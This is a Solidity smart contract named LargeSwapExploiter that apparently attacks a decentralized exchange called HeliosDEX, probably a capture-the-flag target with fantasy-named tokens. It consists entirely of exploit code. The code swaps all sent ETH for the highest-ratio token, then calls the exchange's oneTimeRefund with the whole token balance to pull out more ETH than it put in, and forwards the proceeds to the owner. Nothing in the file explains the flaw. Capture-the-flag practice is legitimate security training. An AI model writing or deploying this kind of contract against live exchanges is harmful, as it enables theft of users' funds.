// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IHeliosDEX {
    function swapForELD() external payable;
    function swapForMAL() external payable;
    function swapForHLS() external payable;
    function eldorionFang() external view returns (address);
    function malakarEssence() external view returns (address);
    function heliosLuminaShards() external view returns (address);
    function oneTimeRefund(address item, uint256 amount) external;
}

contract LargeSwapExploiter {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function exploitLarge(address dexAddress) external payable {
        require(msg.value > 0, "Send ETH");
        IHeliosDEX dex = IHeliosDEX(dexAddress);

        // Try a very large amount - use all available ETH
        uint256 amount = address(this).balance;

        // Try HLS which has the highest ratio (10)
        dex.swapForHLS{value: amount}();

        address hlsToken = dex.heliosLuminaShards();
        uint256 hlsBalance = IERC20(hlsToken).balanceOf(address(this));

        IERC20(hlsToken).approve(dexAddress, hlsBalance);
        dex.oneTimeRefund(hlsToken, hlsBalance);

        // Return all ETH
        payable(owner).transfer(address(this).balance);
    }

    // Fallback function
    receive() external payable {}
}
